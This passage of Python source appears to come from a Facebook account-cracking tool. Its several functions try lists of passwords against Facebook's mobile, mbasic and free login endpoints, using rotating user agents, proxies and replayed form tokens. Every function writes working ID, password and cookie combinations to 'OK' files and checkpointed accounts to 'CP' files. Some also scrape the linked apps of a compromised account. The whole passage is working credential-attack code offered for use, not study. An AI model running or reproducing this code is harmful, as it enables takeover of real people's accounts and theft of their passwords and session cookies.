data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}|{thn}").add(f"[bold yellow]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				user=idf
				infoakun = ""
				session = requests.Session()
				cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
				cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
				apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
				nok=1
				for muncul in apkaktif:
					infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
					nok+=1

				hit=0
				apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
				hit=0
				for muncul in apkexp:
					hit+=1
					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}User ID {P2}  : {H2}{idf}")
				tree.add(f"{P2}Password {P2} : {H2}{pw}")
				tree.add(f"{H3}{ua}{P2}")
				tree.add(f"{H3}{kuki}{P2}")
				tree.add(f"{P2}Active Apk {P2} :                                                  {H2}{infoakun}")
				tree.add(f"{P2}Time crack account {P2} : {H2}{thn}")
				cetak(tree)
				ok+=1
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#--------------------[ NADER ]-----------------#
def crackmobilev2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}Validate M. facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=113289095462482&kid_directed_site=0&app_id=113289095462482&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				#tree.add(f"[bold green]{tahun(idf)}")
				#cetak(panel(f"[bold yellow]Checkpoint-Login")
				tree.add(f"\r{P2}User ID {P2}     : {K2}{idf}")
				tree.add(f"\r{P2}Password {P2}    : {K2}{pw}")
				tree.add(f"{K2}{ua}{P2}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}User ID {P2}  : {H2}{idf}")
				tree.add(f"{P2}Password {P2} : {H2}{pw}")
				tree.add(f"{H3}{ua}{P2}")
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ NADER ]-------------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}Asycn Mbasic.facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=950160105669643&kid_directed_site=0&app_id=950160105669643&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw',
'__csr': '',
'__req': random.choice('abcdefghijklmnopqrstuvwxyz123456789'),
'__a': '',
'__user':0
}
			headers = {'Host': 'm.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent':ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=950160105669643&kid_directed_site=0&app_id=950160105669643&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=950160105669643&auth_token=ac271a0b69b219581ad260574e470ce4&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&refsrc=deprecated&app_id=950160105669643&cancel=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				#tree.add(f"[bold green]{tahun(idf)}")
				#cetak(panel(f"[bold yellow]Checkpoint-Login")
				tree.add(f"\r{P2}User ID {P2}     : {K2}{idf}")
				tree.add(f"\r{P2}Password {P2}    : {K2}{pw}")
				tree.add(f"{K2}{ua}{P2}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}User ID {P2}  : {H2}{idf}")
				tree.add(f"{P2}Password {P2} : {H2}{pw}")
				tree.add(f"{H3}{ua}{P2}")
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ NADER ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}Reguler Free.facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'free.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'yW2guQRJM3jnGatG5yBvokfcLBkNHf9n2TcoDukeOmMfVSQ2JjqH9nh8kfJmiz+n3M1iN4Le5FFdFEGSAsdQpA==','content-length': '166','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				#tree.add(f"[bold green]{tahun(idf)}")
				#cetak(panel(f"[bold yellow]Checkpoint-Login")
				tree.add(f"\r{P2}User ID {P2}     : {K2}{idf}")
				tree.add(f"\r{P2}Password {P2}    : {K2}{pw}")
				tree.add(f"{K2}{ua}{P2}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}User ID {P2}  : {H2}{idf}")
				tree.add(f"{P2}Password {P2} : {H2}{pw}")
				tree.add(f"{H3}{ua}{P2}")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ NADER ]--------------------#
def cracklawakv1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Lawak V1{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link=ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 1
}
			heade ={'Host':'m.facebook.com','x-fb-rlafr': '0','access-control-allow-origin':'*','strict-transport-security':'max-age=15552000; preload; includeSubDomains','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-lsd': 'AVpr73AwpXc','x-fb-debug':'7TIW4GASHMRstipvH3hhndfu8XT7f1n9ogNckpZJRvyGPNJD4u18beO1evCVVkHED0RNJzrKTpKiPfwuP3881A==','content-length':'1447','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-javascript; charset=utf-8','user-agent': ua,'accept':'*/*','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer':'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold red]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[bold green]{idf}|{pw}")
				tree.add(f"[bold green]{kuki}")
				tree.add(f"[bold green]{ua}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ NADER ]--------------------#
def cracklawakv2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	#ua = useragent()
	ua = random.choice(ugen)
	ses = requests.Session()
	prog.update(des,description=f"{h}Lawak V2{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			link = ses.get('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'provided_or_soft_matched',
'prefill_type': 'contact_point',
'first_prefill_source': 'provided_or_soft_matched',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
